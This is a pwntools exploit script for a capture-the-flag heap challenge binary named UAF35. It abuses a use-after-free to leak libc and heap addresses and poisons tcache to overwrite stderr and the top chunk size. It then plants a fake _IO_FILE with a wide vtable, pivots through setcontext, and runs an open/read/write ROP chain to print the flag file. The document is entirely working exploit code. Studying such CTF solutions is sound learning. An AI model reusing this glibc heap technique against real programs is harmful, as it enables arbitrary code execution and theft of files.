#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF35')
libc = ELF('./libc.so.6')
elf = ELF('./UAF35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#=========================libcbase=============================

add(0x420) #0
add(0x400) #1
delete(0)  # 放入 unsortedbin

show(0)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x219ce0 # unsortedbin 与 libc 偏移 == 0x219ce0
pr('libcbase',libcbase)

#===========================key-heapbase=======================

add(0x400) #2 
delete(0) # tcachebin

show(0)
key = u64(p.recv(6).ljust(8, "\x00")) # heap >> 12
heapbase = key << 12
pr('heapbase',heapbase)
pr('key',key)

#==============================================================

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
setcontext_door = libcbase + libc.sym['setcontext'] + 61
stderr = libcbase + libc.sym['stderr']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret
gadget = libcbase + 0x1675b0
ret = prdi_ret + 1 # ret

'''
mov rdx, qword ptr [rdi + 8]; 
mov qword ptr [rsp], rax; 
call qword ptr [rdx + 0x20];
'''

#==========================stderr==============================

edit(0, '\x00'*0x10) 
delete(0)
edit(0, p64(stderr ^ key))
add(0x400, p64(stderr ^ key)) #3
add(0x400, p64(heapbase + 0x2a0)) #4 stderr point fake_IO_FILE

#=====================top_size=================================

delete(0)
edit(0, '\x00'*0x10)
delete(0)
top_size_addr = heapbase + 0xad0
edit(0, p64(top_size_addr ^ key))
add(0x400, p64(top_size_addr ^ key)) #5
add(0x400, p64(0) + p64(0x301)) #6 top_size change

#=========================fake_IO_FILE=========================

context_addr  = heapbase + 0x6d0
IO_FILE_addr  = heapbase + 0x2a0
_IO_jump_t_addr = IO_FILE_addr + 0xe8

fake_IO_FILE  = p64(0) # _flags rdi
fake_IO_FILE += p64(context_addr) # _IO_read_ptr rdi+8
fake_IO_FILE += p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base _wide_data->_IO_write_base = 0
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(1) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end _wide_data->_IO_buf_base = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(IO_FILE_addr) # _wide_data
fake_IO_FILE  = fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps - 0x20) # vtable = _IO_wfile_xsputn - 0x20 = _IO_wfile_overflow
fake_IO_FILE += p64(_IO_jump_t_addr) # _wide_vtable = _IO_jump_t_addr

#======================fake_IO_jump_t=========================

fake_IO_jump_t  = p64(0)
fake_IO_jump_t  = fake_IO_jump_t.ljust(0x68, '\x00')
fake_IO_jump_t += p64(gadget) # _wide_data->_wide_vtable->doallocate = gadget

#=============================orw==============================

frame = SigreturnFrame()
frame.rsp  = context_addr + 0x100 # rsp -> orw
frame.rip  = ret

payload  = p64(0)*4 + p64(setcontext_door)
payload += str(frame)[0x28:]
payload  = payload.ljust(0x100,'\x00')

flag_addr = context_addr + 0x200

# open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload  = payload.ljust(0x200,'\x00') + './flag\x00\x00'

#==============================================================

fake_IO_FILE += fake_IO_jump_t
edit(0, fake_IO_FILE)
edit(1, payload)

#gdb.attach(p)
#pause()

p.sendlineafter(':','1')
p.sendlineafter('len:',str(0x460))

p.interactive()